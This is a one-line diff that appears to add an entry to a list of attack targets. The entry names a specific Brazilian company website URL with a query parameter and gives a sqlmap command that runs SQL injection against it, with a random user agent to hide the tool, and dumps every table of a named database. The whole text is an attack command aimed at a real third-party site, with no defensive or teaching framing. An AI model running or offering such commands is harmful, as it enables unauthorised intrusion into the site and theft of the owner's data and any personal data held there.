@@ -1,0 +1,1 @@
+http://www.levelcontrol.com.br/produtosVazao.php?produtoVazao=1 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.levelcontrol.com.br/produtosVazao.php?produtoVazao=1 -D levelcontrol4 --dump-all
